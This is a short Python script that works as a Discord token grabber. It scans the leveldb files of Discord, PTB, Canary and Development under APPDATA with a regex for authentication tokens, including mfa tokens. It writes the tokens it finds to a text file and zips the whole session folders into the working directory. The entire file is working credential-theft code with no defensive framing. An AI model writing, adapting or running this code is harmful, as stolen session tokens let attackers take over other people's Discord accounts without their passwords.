import os
import re
import zipfile
import shutil

token_regex = re.compile(r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}")
discord_directories = [
    "Discord\\Local Storage\\leveldb",
    "Discord PTB\\Local Storage\\leveldb",
    "Discord Canary\\Local Storage\\leveldb",
    "Discord Development\\Local Storage\\leveldb",
]

def fetch_discord_tokens():
    tokens = []

    for directory in discord_directories:
        path = os.path.join(os.getenv("APPDATA"), directory)
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith(".ldb"):
                    try:
                        with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
                            contents = f.read()
                            matches = token_regex.findall(contents)
                            for match in matches:
                                if match not in tokens:
                                    tokens.append(match)
                    except Exception as ex:
                        print(f"Error reading Discord token from file {file}: {ex}")

    if tokens:
        try:
            file_path = os.path.join(os.getcwd(), "discord_tokens.txt")
            with open(file_path, "w") as f:
                f.write("\n".join(tokens))
            print(f"Discord tokens written to {file_path}")
        except Exception as ex:
            print(f"Error writing Discord tokens file: {ex}")
    else:
        print("No Discord tokens found.")

    try:
        for directory in discord_directories:
            path = os.path.join(os.getenv("APPDATA"), directory)
            if os.path.exists(path):
                dest_path = os.path.join(os.getcwd(), directory.replace('\\', '_') + ".zip")
                shutil.make_archive(dest_path[:-4], "zip", path)
                print(f"Copied Discord session files to {dest_path}")
    except Exception as ex:
        print(f"Error copying Discord session files: {ex}")

if __name__ == "__main__":
    fetch_discord_tokens()
